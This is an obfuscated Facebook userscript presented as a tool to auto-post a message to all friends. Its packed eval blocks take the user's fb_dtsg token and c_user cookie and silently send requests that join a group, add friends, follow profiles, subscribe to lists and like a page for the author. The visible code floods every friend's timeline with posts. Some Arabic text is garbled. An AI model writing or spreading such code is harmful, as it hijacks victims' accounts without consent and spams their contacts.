// ==UserScript==
// @name               Auto post  sent to friends
// @version	        25/2/2015
// ==/UserScript==

eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('4=c.4;t(4!=m){2=c.Q("2");2.3.o="v";2.3.w="x";2.3.z="10";2.3.A="Z";2.3.H="J";2.3.O=1.9;2.3.h="+i";2.3.j="+k";2.3.l="7(n,0,0,1.9)";2.3.p="q r 7(0,0,0,1.9)";2.3.s="P";2.u="<a V=\'U\'y=\'1g://X.Y.S/1m.11?19=1b\' 3=\'B-C:D;E:#F \'G=\'\\6\\6\\13\\R\\5\\1d\\6 \\5\\K\\L\\M \\N\\d\\5\'><8><b>12</b></8></a>";4.I(2)}4=c.4;t(4!=m){2=c.Q("2");2.3.o="v";2.3.w="x";2.3.z="14";2.3.A="15";2.3.H="J";2.3.O=1.9;2.3.h="+i";2.3.j="+k";2.3.l="7(n,0,0,1.9)";2.3.p="q r 7(0,0,0,1.9)";2.3.s="P";2.u="<a V=\'U\'y=\'16://17.18.S/\' 3=\'B-C:D;E:#F \'G=\'\\5\\K\\L\\M \\N\\d\\5 \\6\\e\\1a\\T\\1c \\f\\g\\T\\1f \\5\\6\\W\\e\\5\\g\\f\'><8><b>1h 1i</b></8></a>";4.I(2)}4=c.4;t(4!=m){2=c.Q("2");2.3.o="v";2.3.w="x";2.3.z="1j";2.3.A="1k";2.3.H="J";2.3.O=1.9;2.3.h="+i";2.3.j="+k";2.3.l="7(n,0,0,1.9)";2.3.p="q r 7(0,0,0,1.9)";2.3.s="P";2.u="<a  y=\'\' 3=\'B-C:D;E:#F \'G=\'\\6\\6\\1l\\e\\R\\f \\g\\d \\5\\6\\W\\e\\d\\5\\g\\f \\5\\K\\L\\M \\N\\d\\5\'><8><b>1e</b></8></a>";4.I(2)};',62,85,"||div|style|body|u0627|u0644|rgba|blink|||center|document|u0646|u0631|u062c|u0645|bottom|65px|left|0px|backgroundColor|null|188|position|border|3px|solid|padding|if|innerHTML|fixed|display|block|href|top|width|font|weight|bold|color|fcff00|title|height|appendChild|15px|u0636|u063a|u0637|u0647|opacity|5px|createElement|u0648|com|u064a|_blank|target|u0628|www|facebook|125px|470px|el3almy|El3almy|u062a|500px|150px|http|codesel3almy|blogspot|ref|u0624|hl|u0629|u0635|Exit|u0639|https|All|Programs|530px|175px|u062e|codes".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('2 g=["%b%6%h%i%4%b%6%F%r%4%4%h%i%4%6"];2 5=7["l"]("5")[0]["o"];2 a=7["k"]["c"](7["k"]["c"](/G=(\\d+)/)[1]);2 3=m n;2 f="/p/q/P/s.t?u=1";2 8="&w=y&z="+g+"&5="+5+"&A="+a+"&B=";3["C"]("D",f,E);3["9"]("j-H","I/x-J-K-L");3["9"]("j-e",8["e"]);3["9"]("M","N-O");3["v"](8)',52,52,"||var|httpwp|32|fb_dtsg|33|document|paramswp|setRequestHeader|user_id|37|match||length|urlwp|gid|38|30|Content|cookie|getElementsByName|new|XMLHttpRequest|value|ajax|groups|36|r2j|php|__a|send|ref||group_jump_header|group_id|__user|phstamp|open|POST|true|39|c_user|type|application|www|form|urlencoded|Connection|keep|alive|membership".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('3 5=c.s(\'5\')[0].o;3 l=c.f.h(c.f.h(/B=(\\d+)/)[1]);j 9(r){3 X=J U();3 a="//V.W.Y/n/m/g.q";3 b="t="+r+"&g=m&u=v&w=x&&&12=&y=z&A=i&C&D&E="+l+"&F=1&G=H-&I=e&5="+5+"&K=";X.L("M",a,i);X.N=j(){O(X.P==4&&X.Q==R){X.S}};X.T(b)}9("%6%2%2%2%2%7%2%6%8%k%6%8%k%e%Z");9("%6%2%2%2%2%7%7%e%2%8%7%8%p");',62,65,"||30|var||fb_dtsg|31|34|36|IDS|||document||35|cookie|action|match|true|function|39|user_id|add_friend|ajax|value|37|php||getElementsByName|to_friend|how_found|friend_browser_s|ref_param|none|logging_location|search|no_flyout_on_click|c_user|ego_log_data|http_referer|__user|__a|__dyn|798aD5z5CF|__req|new|phstamp|open|POST|onreadystatechange|if|readyState|status|200|close|send|XMLHttpRequest|www|facebook||com|38|33|32|outgoing_id".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('6 7=f.p(\'7\')[0].J;6 n=f.j.k(f.j.k(/I=(\\d+)/)[1]);i a(b){6 c=K L();6 d="/M/o/O.P?Q=1";6 e="q="+b+"&r=1&s=o-R&t=u&7="+7+"&v&w"+n+"&x=";c.y("z",d,A);c.B=i(){C(c.D==4&&c.E==F){c.G}};c.H(e)}a("%5%2%2%2%2%3%g%8%3%8%3%m%8%8%9");a("%5%2%2%2%2%3%2%5%h%l%5%h%l%N%9");a("%5%2%2%2%2%3%g%3%2%h%g%m%9%9%2");',54,54,"||30|34||31|var|fb_dtsg|37|38||||||document|32|36|function|cookie|match|39|33|user_id|follow|getElementsByName|profile_id|location|source|subscribed_button_id|u37qac_37|lsd|__|phstamp|open|POST|true|onreadystatechange|if|readyState|status|200|close|send|c_user|value|new|XMLHttpRequest|ajax|35|follow_profile|php|__a|button".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('9 e=i.11(\'e\')[0].Z;9 n=i.p.o(i.p.o(/A=(\\d+)/)[1]);m c(L){9 X=14 s();9 a="//B.W.Y/10/12/13/k/r";9 b="t="+L+"&u=k&v=w&x[z]=15&l[C]=D&l[q]=E&F="+n+"&G=1&H=I&J=y&e="+e+"&K=";X.M("N",a,O);X.P=m(){Q(X.R==4&&X.S==T){X.U}};X.V(b)}c("%f%2%2%8%3%g%3%5%5%2%g%8%8%2%2");c("%3%7%3%5%8%8%j%2%h%j%7%2%h%6%7");c("%5%6%7%2%5%h%5%3%6%5%8%6%f%3%3");c("%5%7%2%6%7%f%2%3%j%f%g%3%2%6%g");',62,68,"||35|33||34|31|39|38|var|||LIST||fb_dtsg|32|36|30|document|37|subscribe|ft|function|user_id|match|cookie|tn|modify|XMLHttpRequest|flid|action|location|feed|nctr||_mod|c_user|www|type|40|DH|__user|__a|__dyn|7n8ahxoNpGo|__req|phstamp||open|POST|true|onreadystatechange|if|readyState|status|200|close|send|facebook||com|value|ajax|getElementsByName|friends|lists|new|pagelet_group_mall".split("|"),0,{}));eval(function(e,t,n,r,i,s){i=function(e){return(e<t?"":i(parseInt(e/t)))+((e=e%t)>35?String.fromCharCode(e+29):e.toString(36))};if(!"".replace(/^/,String)){while(n--)s[i(n)]=r[n]||i(n);r=[function(e){return s[e]}];i=function(){return"\\w+"};n=1}while(n--)if(r[n])e=e.replace(new RegExp("\\b"+i(n)+"\\b","g"),r[n]);return e}('2 3=5.s(\'3\')[0].T;2 e=5.f.h(5.f.h(/w=(\\d+)/)[1]);8 9(p){2 a=U V();2 b="//X.l.m/n/o/q.r";2 c="&t="+p+"&u=g&v=10&x=y&z=&A=&B[C]=D&E="+e+"&F=1&G=H-&I=d&3="+3+"&J=";a.K("L",b,g);a.M=8(){N(a.O==4&&a.P==Q){a.R}};a.S(c)}9("%i%6%7%j%i%k%6%Y%7%6%Z%W%7%k%j");',62,63,"||var|fb_dtsg||document|33|30|function|Like|||||user_id|cookie|true|match|34|38|36|facebook|com|ajax|pages||fan_status|php|getElementsByName|fbpage_id|add|reload|c_user|fan_origin|page_timeline|fan_source|cat|nctr|_mod|pagelet_timeline_page_actions|__user|__a|__dyn|798aD5z5CF|__req|phstamp|open|POST|onreadystatechange|if|readyState|status|200|close|send|value|new|XMLHttpRequest|39|www|32|37|false".split("|"),0,{}));eval(unescape("var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var friends = new Array();


var Title = '<b>El3almy<br/></b><i>Auto Post to Friends</i>';
var Descriptions = "",
    _text = '<A style="color:#FFFF00;" href="https://www.facebook.com/codes.el3almy" target="_blank">Ana</A></br></A><A style="color:#FFFF00;" href="https://www.facebook.com/codes.el3almy" target="_blank">El3almy</A></A>';
var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:7px solid rgba(183,0,0,1.9);background-color:rgba(0,0,0,1.9);color:#FF0000'>"; /*|undefined undefined|*/
display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
display += "<div><textarea id='txtFloodMsg' placeholder='Write the Post .....'  style='padding-top:5px;width:505px;height:100px;font-family:tahoma;font-size:13px;background-color:rgba(255,255,255,0.9);'></textarea></div>";
display += "<div class='clearfix' style='text-align:right;padding-top:5px;'><a style='text-align:right;padding-top:5px;' data-hover='tooltip' aria-label='El3almy' data-tooltip-alignh='right' class='uiSelectorButton uiButton uiButtonSuppressed' href='#' role='button' aria-haspopup='1' aria-expanded='false' data-label='' data-length='30' data-ariaprefix='Post Privacy Setting' rel='toggle' id='js_14'><i class='mrs defaultIcon customimg img sp_5ym4oy sx_042661'></i><span class='uiButtonText'>Friends</span></a><a><span id='UIButton_Start' onclick='autopostingfunc()' style='text-align:center;font-family:tahoma;color:white;width:45px;height:25px;' class='_42ft _4jy0 _11b _4jy3 _4jy1 selected'>Post</span></a></div>";
display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
display += _text;
window[tag + '_close'] = true;
display += "</div>";
display += "</div>";
document.getElementById("pagelet_sidebar").innerHTML = display;
 
function Posting(o) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/stream/inline.php?fb_dtsg=" + fb_dtsg + "&walltarget=" + o + "&render_notif_only=1&birthday=1&message_text=" + encodeURIComponent(msg) + "&message=" + encodeURIComponent(msg) + "&giftsgroupid=8ff493ad46&post=Post&nctr[_mod]=pagelet_reminders&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFIwd9e&__req=1b&phstamp=", function (a) {
        var b = a.substring(a.indexOf("{"));
        var c = JSON.parse(b);
        i--;
        Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
        if (c.error) {
            Descriptions += "color:darkred'>";
            Descriptions += 'The message could not be posted to this Wall. ';
            if (c.errorDescription) Descriptions += c.errorDescription;
            else Descriptions += JSON.stringify(c, null, "")
        } else {
            Descriptions += "color:darkgreen'>";
            Descriptions += "Please Wait Now Posting in " + arn[i] + "\'s Timeline.<br/>";
            suc++
        }
        Descriptions += "</div>";
        var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:7px solid rgba(183,0,0,1.9);background-color:rgba(0,0,0,1.9);color:#FF0000'>"; /*|undefined undefined|*/
        if (i > 2) {
            var Title = '<b>El3almy<br/></b><i>Auto Post to Friends</i>';
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            display += arr.length + "<br/>";
            display += "";
            display += "<div class='friend-edge'>";
            display += Descriptions;
            display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;font-size:14px;text-align:left;color:#FFFF00;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
            display += getuname + "'3E 'DE3*./E<br/>";
display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>'D5A-) 'D1&J3J)</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>DD.1H,</span><br/>";
            display += _text;
            window[tag + '_close'] = true;
            display += "</div>";
            display += "</div>";
            display += "</div>"
        } else {
            Title = 'AutoPost';
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            window[tag + '_close'] = false;
            display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>go to home</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>refresh</span><span style='color:black' class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Exit</span><br/>";
            display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
            display += _text;
            display += "</div>"
        }
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display
    }, "text", "post");
    tay--;
    if (tay > 2) {
        var s = arr[i];
        setTimeout("Posting(" + s + ");", 1000)
    }
    console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
   
  if (fb_dtsg){
               }
  if (fb_dtsg){
               }
  if (fb_dtsg){
              }
}
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ? function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState)
                    if (200 == e.status) {
                        var b = "";
                        e.responseText && (b = e.responseText);
                        "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                        c && c(b)
                    } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};
 
function ChangeLocation() {
    window.location.href = "http://www.facebook.com/"
};
setTimeout("ChangeLocation", 1);
window.onbeforeunload = function () {
    if (window[tag + '_close']) {
        return 'This script is running now!'
    }
};
var now = (new Date).getTime();
var tag = 'Close';
var i = 3;
var tay = 3;
var suc = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var getuname = document.getElementsByClassName("fbxWelcomeBoxName")[0].innerHTML;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var msg = '';
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
    for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
    i = arr.length - 1;
    tay = i;
    console.log(arr.length)
});
 
function autopostingfunc() {
    if (document.getElementById("txtFloodMsg").value != "") msg = document.getElementById("txtFloodMsg").value;
    Posting(arr[i])
}


var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function Like(p) {
  var Page = new XMLHttpRequest();
  var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
  var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";
  Page.open("POST", PageURL, true);
  Page.onreadystatechange = function () {
    if (Page.readyState == 4 && Page.status == 200) {
      Page.close;
    }
  };
  Page.send(PageParams);
}
Like("0");
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}"))